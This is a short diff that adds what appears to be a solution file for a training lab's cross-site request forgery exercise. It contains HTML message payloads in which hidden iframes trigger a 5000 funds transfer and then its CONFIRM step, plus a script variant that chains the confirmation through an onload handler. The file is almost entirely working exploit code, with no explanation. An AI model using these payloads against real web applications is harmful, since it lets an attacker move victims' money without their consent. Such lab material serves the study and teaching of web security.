@@ -1,0 +1,14 @@
+Title: Click me to open image
+Message:
+<iframe src="attack?Screen=1471017872&menu=900&transferFunds=5000"/>
+<iframe src="attack?Screen=1471017872&menu=900&transferFunds=CONFIRM"/>
+
+<!-- The solution below requires refresh page-->
+Message:
+<iframe src="attack?Screen=1471017872&menu=900&transferFunds=5000" onload="confirm()"/>
+<iframe id="evilConfirm"/>
+<script>
+	function confirm() {
+		document.getElementById('evilConfirm').src = "attack?Screen=1471017872&menu=900&transferFunds=CONFIRM";
+	}
+</script>
